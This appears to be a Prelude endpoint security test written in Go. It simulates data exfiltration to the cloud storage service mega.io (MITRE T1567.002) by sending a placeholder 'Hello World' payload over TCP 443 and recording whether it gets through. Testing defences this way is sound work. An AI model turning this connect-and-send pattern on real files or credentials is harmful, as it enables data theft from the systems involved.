/*
ID: 2bd2fdf2-07e7-4759-8f0d-ca35e64689c0
NAME: Mega.io Exfiltration
TECHNIQUE: T1567.002
UNIT: response
CREATED: 2024-01-04 16:15:36.978988
*/
package main

import (
	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
	Network "github.com/preludeorg/libraries/go/tests/network"
)

func test() {
	MegaExfil()
}

func MegaExfil() {
	Endpoint.Say("Attempting data exfiltration to mega.io")

	err := Network.TCP("mega.io", "443", []byte("Hello World"))
	if err != nil {
		Endpoint.Say("Data exfiltration attempt failed")
		Endpoint.Stop(126)
		return
	}

	Endpoint.Say("Data exfiltrated successfully")
	Endpoint.Stop(101)
}

func main() {
	Endpoint.Start(test)
}
